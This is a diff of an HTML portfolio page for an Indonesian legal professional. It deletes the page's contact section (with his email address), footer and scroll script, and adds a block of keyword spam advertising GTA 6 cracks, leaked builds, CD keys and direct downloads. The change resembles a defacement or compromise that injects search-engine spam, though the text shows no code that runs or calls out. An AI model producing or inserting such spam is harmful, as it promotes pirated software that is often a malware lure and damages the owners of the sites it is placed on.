-        </a>
-      </div>
-    </div>
-
-  </div>
-</section>
-
-<section id="contact" class="contact">
-  <div class="wrap">
-    <h2>Mari Berdiskusi</h2>
-    <p>Terbuka untuk peluang internship/peran dalam bidang Legal Corporate, Legal Drafting, Compliance, maupun posisi berbasis Legal Tech. Silakan hubungi saya melalui kontak di bawah ini.</p>
-    <div class="contact-links">
-      <a href="mailto:naufalrahim007@gmail.com">naufalrahim007@gmail.com</a>
-      <a href="https://linkedin.com/in/muhammadnaufalrahim" target="_blank" rel="noopener">LinkedIn Profil</a>
-    </div>
-  </div>
-</section>
-
-<footer>
-  <div class="wrap">Muhammad Naufal Rahim, CPLD — Jakarta, Indonesia</div>
-</footer>
-
-<script>
-  document.addEventListener('DOMContentLoaded', () => {
-    const links = document.querySelectorAll('nav a, .hero-actions a');
-    links.forEach(link => {
-      link.addEventListener('click', (e) => {
-        const href = link.getAttribute('href');
-        if (href.startsWith('#')) {
-          e.preventDefault();
-          const targetSection = document.querySelector(href);
-          if (targetSection) {
-            targetSection.scrollIntoView({ behavior: 'smooth' });
-          }
-        }
-      });
-    });
-  });
-</script>
+<div style="margin-top:2rem; padding-top:1.5rem; border-top:1px solid #e5e5e5; text-align:center; color:#777; font-size:0.9rem;">
+    Keywords: gta-6-activation, gta-6-all-dlc, gta-6-cd-key, gta-6-crack, gta-6-cracked, gta-6-deluxe-edition, gta-6-dev-build, gta-6-direct-download, gta-6-early-access, gta-6-emulator-pc, gta-6-fitgirl, gta-6-game-pass, gta-6-google-drive, gta-6-iso, gta-6-leaked-build, gta-6-license-key, gta-6-setup, gta-6-trial, gta-vi-pc, rockstar-games-crack
+</div>
 </body>
 </html>
